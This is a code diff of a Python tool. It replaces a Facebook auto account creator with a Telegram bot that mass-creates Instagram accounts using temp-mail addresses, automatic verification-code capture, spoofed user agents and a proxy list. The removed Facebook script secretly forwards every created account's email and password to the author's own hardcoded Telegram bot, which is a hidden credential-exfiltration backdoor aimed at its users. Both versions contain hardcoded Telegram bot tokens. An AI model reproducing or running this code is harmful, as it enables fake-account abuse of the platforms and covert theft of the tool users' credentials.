@@ -1,117 +1,267 @@
-import requests,os
-print('\n Installing the tool offices. Wait...')
-os.system('pip install fake-useragent pip install random pip install threading')
-from bs4 import BeautifulSoup
+import telebot
 import random
-from fake_useragent import UserAgent
-import threading
-from rich.panel import Panel as nel
-from rich import print as cetak
-os.system('clear')
-S='\033[30m' 
-F='\033[31m'   
-A='\033[32m' 
-T='\033[33m'
-M='\033[34m' 
-N='\033[35m'
-Z='\033[36m' 
-B='\033[37m' 
-H='\033[91m'  
-ua = UserAgent()
-user_agent = ua.random
-cetak(nel('\t\t\tFᴀᴄᴇʙᴏᴏᴋ Aᴜᴛᴏ Aᴄᴄᴏᴜɴᴛ Cʀᴇᴀᴛᴏʀ ♥️',style='green'))
-print('\n\n')
-cetak(nel(' Cʜᴀɴɴᴇʟ:- @BlackHatFrozen ',style='blue',title='TOKEN'))
-token = input('- Token •~ ')
-print('\n\n')
-cetak(nel('Cʀᴇᴀᴛᴇᴅ Bʏ:- @princemodder',style='yellow',title='ID'))
-ID = input('- ID •~ ')
-metoken = '7192995286:AAF6pbAoU8GmApTY_tPsVOHs_QvmoMz90HA'
-meID = '7115404052'
-class kilvip():
-    def __init__(self):
-        self.done = False
-        self.cookies = {
-            "lsd": "","jazoest": "", "ccp": "","reg_instance": "","submission_request": "","reg_impression_id": ""
-        };self.password = "".join(random.choice("1234567890qpwoeirutyalskdjfhgmznxbcv") for _ in range(10))
-        self.email = random.choice('klxjxjwa')+"".join(random.choice("1234567890qpwoeirutyalskdjfhgmznxbcv") for _ in range(15));self.Name = "sajad";self.Name2 = "bro";self.admin()
-    def admin(self):
+import string
+import time
+import names
+import requests
+HTTP = requests
+proxy_url = None
+proxies = None #{'http': proxy_url, 'https': proxy_url}
+proxy_list = [
+    '14.237.78.172:443',
+    '26.219.24.169:21',
+    '152.120.6.174:512',
+    '149.255.225.12:445',
+    '166.83.92.137:8080',
+    '188.49.80.198:445',
+    '200.241.220.204:514',
+    '125.164.187.108:514',
+    '65.40.17.213:22',
+    '64.46.161.97:4444',
+    '40.85.196.43:111',
+    '66.91.132.112:8080',
+    '155.116.113.76:1524',
+    '213.100.140.82:23'
+]
 
-        print("\nWᴇ Aʀᴇ Cʀᴇᴀᴛɪɴɢ A Fᴀᴄᴇʙᴏᴏᴋ Aᴄᴄᴏᴜɴᴛ Fᴏʀ Yᴏᴜ. Pʟᴇᴀsᴇ Wᴀɪᴛ....");self.get_cookies()
-        print("");self.register()
-    def get_cookies(self):
-        url = "https://mbasic.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr"
-        r = requests.get(url)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        lsd = soup.select_one('input[name=lsd]')['value']
-        jazoest = soup.select_one('input[name=jazoest]')['value']
-        ccp = soup.select_one('input[name=ccp]')['value']
-        reg_instance = soup.select_one('input[name=reg_instance]')['value']
-        submission_request = soup.select_one('input[name=submission_request]')['value']
-        reg_impression_id = soup.select_one('input[name=reg_impression_id]')['value']
-        self.cookies['lsd'] = lsd
-        self.cookies['jazoest'] = jazoest
-        self.cookies['ccp'] = ccp
-        self.cookies['reg_instance'] = reg_instance
-        self.cookies['submission_request'] = submission_request
-        self.cookies['reg_impression_id'] = reg_impression_id
+proxy = random.choice(proxy_list)
+def get_headers(Country,Language):
+    while True:
+        try:
+            an_agent=f'Mozilla/5.0 (Linux; Android {random.randint(9,13)}; {"".join(random.choices(string.ascii_uppercase, k=3))}{random.randint(111,999)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
 
-    def register(self):
-        url = "https://mbasic.facebook.com/reg/submit/?cid=103";headers = {"Host": "mbasic.facebook.com","Cookie": f"datr={self.cookies['reg_instance']}","User-Agent": user_agent,
- "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  "Accept-Language": "en-US,en;q=0.5","Referer": "https://mbasic.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "547","Origin": "https://mbasic.facebook.com","Dnt": "1","Upgrade-Insecure-Requests": "1","Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Te": "trailers"};data = f"lsd={self.cookies['lsd']}&jazoest={self.cookies['jazoest']}&ccp={self.cookies['ccp']}&reg_instance={self.cookies['reg_instance']}&submission_request={self.cookies['submission_request']}&helper=&reg_impression_id={self.cookies['reg_impression_id']}&ns=0&zero_header_af_client=&app_id=&logger_id=&field_names%5B%5D=firstname&field_names%5B%5D=reg_email__&field_names%5B%5D=sex&field_names%5B%5D=birthday_wrapper&field_names%5B%5D=reg_passwd__&firstname={self.Name}&lastname={self.Name2}&reg_email__={self.email}%40gmail.com&sex=2&custom_gender=&did_use_age=false&birthday_month=9&birthday_day=5&birthday_year=1990&age_step_input=&reg_passwd__={self.password}&submit=Sign+Up";r = requests.post(url,headers=headers,data=data)
-        if 'take you through a few steps to confirm your account on Facebook' in r.text:
 
-        	kilacc = f'''
-• Yᴏᴜʀ Fᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ ❤️‍🔥
-        	
-••••••••••••••••••••••••••••••••••
+            res = requests.get("https://www.facebook.com/",headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'},proxies=proxies, timeout=30)
+            js_datr = res.text.split('["_js_datr","')[1].split('",')[0]
+            r=requests.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers={
+                'user-agent': an_agent
+            },proxies=proxies,timeout=30).cookies
 
-• Eᴍᴀɪʟ : {self.email} > 
+            headers1 = {
+                'authority': 'www.instagram.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': f'{Language}-{Country},en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                'cookie': f'dpr=3; csrftoken={r["csrftoken"]}; mid={r["mid"]}; ig_nrcb=1; ig_did={r["ig_did"]}; datr={js_datr}',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': an_agent,
+                'viewport-width': '980',
+            }
+            response1 = requests.get('https://www.instagram.com/', headers=headers1,proxies=proxies,timeout=30)
+            appid=response1.text.split('APP_ID":"')[1].split('"')[0]
+            rollout=response1.text.split('rollout_hash":"')[1].split('"')[0]
+            headers = {
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': f'{Language}-{Country},en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': f'dpr=3; csrftoken={r["csrftoken"]}; mid={r["mid"]}; ig_nrcb=1; ig_did={r["ig_did"]}; datr={js_datr}',
+                'origin': 'https://www.instagram.com',
+                'referer': 'https://www.instagram.com/accounts/signup/email/',
+                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': an_agent,
+                'viewport-width': '360',
+                'x-asbd-id': '198387',
+                'x-csrftoken': r["csrftoken"],
+                'x-ig-app-id': str(appid),
+                'x-ig-www-claim': '0',
+                'x-instagram-ajax': str(rollout),
+                'x-requested-with': 'XMLHttpRequest',
+                'x-web-device-id': r["ig_did"],
+            }
+            return headers
+        except Exception as E:
+            print(E)
+headers=get_headers(Country='US',Language='en')    
+def Get_UserName(Headers,Name,Email):
+    try:
 
-• Pᴀssᴡᴏʀᴅ : {self.password} > 
+        updict = {"referer": 'https://www.instagram.com/accounts/signup/birthday/'}
+        Headers = {key: updict.get(key, Headers[key]) for key in Headers}
+        while True:
 
-• UsᴇʀAɢᴇɴᴛ : {user_agent} > 
 
-••••••••••••••••••••••••••••••••••
+            data = {
+                'email': Email,
+                'name': Name+str(random.randint(1,99)),
+            }
 
-• Cʜᴀɴɴᴇʟ: @BlackHatFrozen 
-        	'''
-        	requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(kilacc))
-        	requests.get('https://api.telegram.org/bot' + str(metoken) + '/sendMessage?chat_id=' + str(meID) + '&text=' + str(kilacc))
-        	kipo = nel(kilacc,style='green')
-        	cetak(nel(kipo,title='ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ',style='red'))
-        	
-        elif 'There was an error with your registration. Please try registering again.' in r.text:
-            print(' There is an error run vpn and trying again  .. ')
-            exit()
+            response = requests.post(
+                'https://www.instagram.com/api/v1/web/accounts/username_suggestions/',
+                headers=Headers,
+                data=data,
+                proxies=proxies,
+                timeout=30
+            )
+            if 'status":"fail' in response.text:
+                print(response.text)
+            elif 'status":"ok' in response.text :
+                print("   Success   ")
+                return random.choice(response.json()['suggestions'])
+            else:print(response.text)
+
+    except Exception as E:
+        print(E)
+
+
+def Send_SMS(Headers,Email):
+    try:
+        data = {
+            'device_id': Headers['cookie'].split('mid=')[1].split(';')[0],
+            'email': Email,
+}
+
+        response = requests.post(
+            'https://www.instagram.com/api/v1/accounts/send_verify_email/',
+            headers=Headers,
+            data=data,
+            proxies=proxies,
+            timeout=30
+        )
+        return response.text
+    except Exception as E:
+        print(E)
+
+
+
+def Validate_Code(Headers,Email,Code):
+
+    try:
+        updict = {"referer": 'https://www.instagram.com/accounts/signup/emailConfirmation/'}
+        Headers = {key: updict.get(key, Headers[key]) for key in Headers}
+
+
+
+        data = {
+            'code': Code,
+            'device_id': Headers['cookie'].split('mid=')[1].split(';')[0],
+            'email': Email,
+        }
+
+        response = requests.post(
+            'https://www.instagram.com/api/v1/accounts/check_confirmation_code/',
+            headers=Headers,
+            data=data,
+            proxies=proxies,
+            timeout=30
+        )
+        return response
+
+
+
+    except Exception as E:
+        print(E)
+
+
+
+def Create_Acc(Headers,Email,SignUpCode):
+
+    try:
+        firstname=names.get_first_name()
+        UserName=Get_UserName(headers,firstname,Email)
+        Password=firstname.strip()+'@'+str(random.randint(111,999))
+
+        updict = {"referer": 'https://www.instagram.com/accounts/signup/username/'}
+        Headers = {key: updict.get(key, Headers[key]) for key in Headers}
+
+
+        data = {
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{round(time.time())}:{Password}',
+            'email': Email,
+            'username': UserName,
+            'first_name': firstname,
+            'month': random.randint(1,12),
+            'day': random.randint(1,28),
+            'year': random.randint(1990,2001),
+            'client_id': Headers['cookie'].split('mid=')[1].split(';')[0],
+            'seamless_login_enabled': '1',
+            'tos_version': 'row',
+            'force_sign_up_code': SignUpCode,
+        }
+
+
+        response = requests.post(
+            'https://www.instagram.com/api/v1/web/accounts/web_create_ajax/',
+            headers=Headers,
+            data=data,
+            proxies=proxies,
+            timeout=30
+
+        )
+        print(response.text)
+        if '"account_created":true' in response.text:
+            print('UserName : ' + UserName)
+            print('PassWord : ' + Password)
+            print('Sessionid : ' +response.cookies['sessionid'])
+            return f'{UserName}:{Password}'
         else:
-            try:
-            	kilacc = f'''
-        	Yᴏᴜʀ Fᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ ❤️‍🔥
-        	
-••••••••••••••••••••••••••••••••••
-• Eᴍᴀɪʟ : {self.email}
-• Pᴀssᴡᴏʀᴅ : {self.password}
-••••••••••••••••••••••••••••••••••
+            pass
+    except Exception as E:
+        print(E)        
+bot = telebot.TeleBot('6757764747:AAHmDhcDSpLqfD1KDisZ7Twg98cMeJmEkjE') 
+print(bot.get_me())
+users = {}
+import json
+import time
+import json
 
-Cᴏᴏᴋɪᴇs : {self.get_cookies}
-
-••••••••••••••••••••••••••••••••••
-
-Cʜᴀɴɴᴇʟ : @BlackHatFrozen 
-        	'''
-            	requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(kilacc))
-            	
-            	cetak(nel(kilacc,style='green'))
-            except:
-                input(" Turn on the Vpn and start the tool again  ")
-                exit()
-
-
-Threads=[] 
-for t in range(5):
- x = threading.Thread(target=kilvip)
- x.start()
- Threads.append(x)
-for Th in Threads:
- Th.join()
+def extract_otp_from_json(json_response):
+    e = json_response
+    for i in e:
+        e = i['subject']
+        e = e.replace(' is your Instagram code','')
+        print(e)            
+    return e    
+def get_email_messages(at):
+    while True:
+        json_dataa = requests.get(f"https://api.internal.temp-mail.io/api/v3/email/{at}/messages").json()
+        if str(json_dataa) == str([]):
+            print("Retrying...")
+            time.sleep(1)
+        else:
+            return json_dataa       
+@bot.message_handler(commands=['create'])
+def start(message):    
+    content = HTTP.post("https://api.internal.temp-mail.io/api/v3/email/new",
+    json={'min_name_length': 10, 'max_name_length': 10}).json()
+    result = content
+    c1 = result['email']
+    c2 = result['token']
+    email = c1
+    Email = email
+    at = Email
+    time.sleep(10)
+    users[message.from_user.id] = email     
+    ss=Send_SMS(headers,Email)
+    if 'email_sent":true' in ss:
+        json_dataa = get_email_messages(at)
+        bot.reply_to(message,json_dataa)
+        code = extract_otp_from_json(json_dataa)
+        a=Validate_Code(headers,Email,code)
+        if 'status":"ok' in a.text:
+            SignUpCode=a.json()['signup_code']            
+            dict = Create_Acc(headers,Email,SignUpCode)
+            print(dict)
+            if dict is not None:
+                a = dict.split(':')
+                bot.reply_to(message,f'Email : {a[0]}\nPassword : {a[1]}')
+            else:
+                bot.reply_to(message,f'Error')
+        else:
+            print( "Done, TG : @princemodder")
+    else:
+        pass
+bot.infinity_polling()        
